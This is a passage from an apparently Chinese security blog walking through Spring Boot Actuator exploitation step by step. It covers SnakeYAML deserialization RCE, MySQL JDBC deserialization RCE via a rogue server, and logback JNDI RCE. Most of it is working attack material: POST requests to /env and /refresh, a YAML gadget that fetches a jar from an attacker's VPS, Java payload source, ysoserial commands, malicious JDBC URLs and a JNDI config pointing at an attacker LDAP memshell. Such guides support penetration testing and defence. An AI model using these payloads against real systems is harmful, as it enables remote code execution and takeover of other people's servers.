class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><h1 id="spring-cloud-SnakeYAML-RCE"><a href="#spring-cloud-SnakeYAML-RCE" class="headerlink" title="spring cloud SnakeYAML RCE"></a>spring cloud SnakeYAML RCE</h1><h2 id="1-利用条件：-1"><a href="#1-利用条件：-1" class="headerlink" title="1 利用条件："></a>1 利用条件：</h2><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h2 id="2-利用方法："><a href="#2-利用方法：" class="headerlink" title="2 利用方法："></a>2 利用方法：</h2><h3 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h3><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/8f83a087a04420c0d431f5ad8b526373.png" alt="image-20220129144602894"></p><p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f060ef15b802765e2c88898683acc65d.png" alt="image-20220129144519323"></p><p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，</p><p>代码编写及编译方式参考 (<a href="https://github.com/artsploit/yaml-payload\)。" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload\)。</a></p><p>AwesomeScriptEngineFactory.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AwesomeScriptEngineFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"dig quonwz.dnslog.cn"</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getMimeTypes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getNames</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getParameter</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOutputStatement</span><span class="params">(String toDisplay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProgram</span><span class="params">(String... statements)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ScriptEngine <span class="title">getScriptEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src&#x2F; .</span><br></pre></td></tr></table></figure><p>打包完成</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0684327bc6dadd4d7bc54e66ab3a719c.png" alt="image-20211224140901914"></p><h3 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h3><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml![]()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c32e8d4fc6ffdb0ac32ca82e6a88fdf4.png" alt=""></p><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h3><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6b7c1ef47121b177fe49a5f9f291cae0.png" alt="image-20211224144527246"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/03507b7045e2cd8a23d1d75622e0851e.png" alt="image-20211224144604954"></p><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><h2 id="3-漏洞原理："><a href="#3-漏洞原理：" class="headerlink" title="3 漏洞原理："></a>3 漏洞原理：</h2><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h2 id="4-利用过程分析："><a href="#4-利用过程分析：" class="headerlink" title="4 利用过程分析："></a>4 利用过程分析：</h2><p>首先简单总结一下利用过程</p><ol><li>利用 <code>/env</code> endpoint 修改 <code>spring.cloud.bootstrap.location</code> 属性值为一个外部 yml 配置文件 url 地址，如 <code>http://127.0.0.1:63712/yaml-payload.yml</code></li><li>请求 <code>/refresh</code> endpoint，触发程序下载外部 yml 文件，并由 SnakeYAML 库进行解析，因 SnakeYAML 在反序列化时支持指定 class 类型和构造方法的参数，结合 JDK 自带的 <code>javax.script.ScriptEngineManager</code> 类，可实现加载远程 jar 包，完成任意代码执行</li></ol><p>从过程中我们知道，命令执行是由于 SnakeYAML 在解析 YAML 文件时，存在反序列化漏洞导致的，来看一个使用 SnakeYAML 库反序列化的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void testYaml() &#123;</span><br><span class="line">    Yaml yaml &#x3D; new Yaml();</span><br><span class="line">    Object url &#x3D; yaml.load(&quot;!!java.net.URL [\&quot;http:&#x2F;&#x2F;127.0.0.1:63712&#x2F;yaml-payload.jar\&quot;]&quot;);</span><br><span class="line">    &#x2F;&#x2F; class java.net.URL</span><br><span class="line">    System.out.println(url.getClass());</span><br><span class="line">    &#x2F;&#x2F; http:&#x2F;&#x2F;127.0.0.1:63712&#x2F;yaml-payload.jar</span><br><span class="line">    System.out.println(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SnakeYAML 支持 <code>!!</code> + 完整类名的方式来指定要反序列化的类，然后以 <code>[arg1, arg2, ...]</code> 的方式来传递构造方法参数，例子中的代码执行完后会出反序列化一个 <code>java.net.URL</code> 类的实例</p><p>再来看一下文章给出的外部 yml 文件 <code>yaml-payload.yml</code> 的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http:&#x2F;&#x2F;127.0.0.1:61234&#x2F;yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>SnakeYAML 处理上述内容的过程可以等价于以下 java 代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1:63712&#x2F;yaml-payload.jar&quot;);</span><br><span class="line">new ScriptEngineManager(new URLClassLoader(new URL[]&#123;url&#125;));</span><br></pre></td></tr></table></figure><p>代码执行后，会从 <code>http://127.0.0.1:63712/yaml-payload.jar</code> 地址下载 jar 包，并在包中寻找一个 <code>javax.script.ScriptEngineFactory</code> 接口的实现类，然后实例化，因为这个 jar 包代码是可控的，因此可执行任意代码</p><h2 id="5-漏洞环境："><a href="#5-漏洞环境：" class="headerlink" title="5 漏洞环境："></a>5 漏洞环境：</h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce" target="_blank" rel="noopener">repository/springcloud-snakeyaml-rce</a></p><p>正常访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9092&#x2F;env</span><br></pre></td></tr></table></figure><h1 id="springboot-mysql-jdbc-deserialization-RCE"><a href="#springboot-mysql-jdbc-deserialization-RCE" class="headerlink" title="springboot mysql jdbc deserialization RCE"></a>springboot mysql jdbc deserialization RCE</h1><h2 id="1-利用条件：-2"><a href="#1-利用条件：-2" class="headerlink" title="1 利用条件："></a>1 利用条件：</h2><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h2 id="2-漏洞原理：-2"><a href="#2-漏洞原理：-2" class="headerlink" title="2 漏洞原理："></a>2 漏洞原理：</h2><ol><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ol><h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3 利用过程"></a>3 利用过程</h2><h3 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h3><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c7e98fdc87a791558d9c483c2d3b9cc5.png" alt="image-20211208135505340"></p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bc2e2a5847d95eca330fee0757177d0c.png" alt="image-20211208135537355"></p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/db1c9547f8ccbe24f775537efa8bd63b.png" alt="image-20211208135606250"></p><h3 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h3><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py" target="_blank" rel="noopener">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 自定义要执行的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><h3 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h3><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure><p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url&#x3D;对应属性值</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ab4e2290cee71f2fdcffd2fb679b9a8c.png" alt="image-20211208142322601"></p><h3 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h3><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/762d2531957958354053a8b6062254f5.png" alt="image-20211208143044550"></p><h3 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h3><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http:&#x2F;&#x2F;127.0.0.1:9097&#x2F;&#x2F;product&#x2F;list</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/dfd49ee586cf53c065e3cf1882ff6f74.png" alt="image-20211208143638795"></p><h3 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h3><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><h1 id="restart-logging-config-logback-JNDI-RCE"><a href="#restart-logging-config-logback-JNDI-RCE" class="headerlink" title="restart logging.config logback JNDI RCE"></a>restart logging.config logback JNDI RCE</h1><h2 id="1-利用条件：-3"><a href="#1-利用条件：-3" class="headerlink" title="1 利用条件："></a>1 利用条件：</h2><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><h2 id="2-利用方法：-1"><a href="#2-利用方法：-1" class="headerlink" title="2 利用方法："></a>2 利用方法：</h2><p>步骤零：找到目标网站</p><p>发现<code>spring actuator</code> 目前主要有两个差别比较大的版本，1.x 和 2.x 版本。从路由角度看，2.x 版本的路由名一般比 1.x 版本路由名字前多了个 <code>/actuator</code> 前缀。本文涉及到的相关漏洞原理经过测试与 <code>spring actuator</code> 大版本的相关度差别不大，下文统一用 2.x</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fb5b5542a58d4ebb5f1202be04618817.png" alt="image-20220106101333986"></p><h3 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h3><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"ldap://110.xx.xx.110:1389/TomcatBypass/TomcatMemshell3"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h3><p>修改 <a href="https://github.com/feihong-cs/JNDIExploit" target="_blank" rel="noopener">JNDIExploit</a> 并启动（也可以使用其他工具）：</p><p><a href="https://github.com/feihong-cs/JNDIExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/JNDIExploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i 110.xx.xx.110</span><br></pre></td></tr></table></figure><h3 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h3><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 